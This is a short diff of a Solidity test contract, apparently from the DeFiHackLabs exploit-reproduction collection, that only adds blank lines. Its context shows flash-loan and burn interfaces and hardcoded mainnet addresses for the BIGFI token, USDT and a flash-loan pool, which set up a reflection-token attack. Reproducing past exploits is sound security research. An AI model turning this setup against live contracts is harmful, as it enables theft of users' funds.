@@ -12,14 +12,19 @@ import "./../interface.sol";
 // https://github.com/SunWeb3Sec/DeFiHackLabs#20230210---sheep---reflection-token
 
 interface RDeflationERC20 is IERC20 {
+
     function burn(uint256 amount) external;
+
 }
 
 interface ISwapFlashLoan {
+
     function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;
+
 }
 
 contract ContractTest is Test {
+
     RDeflationERC20 BIGFI = RDeflationERC20(0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13);
@@ -83,4 +88,5 @@ contract ContractTest is Test {
             BIGFI.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
+
 }
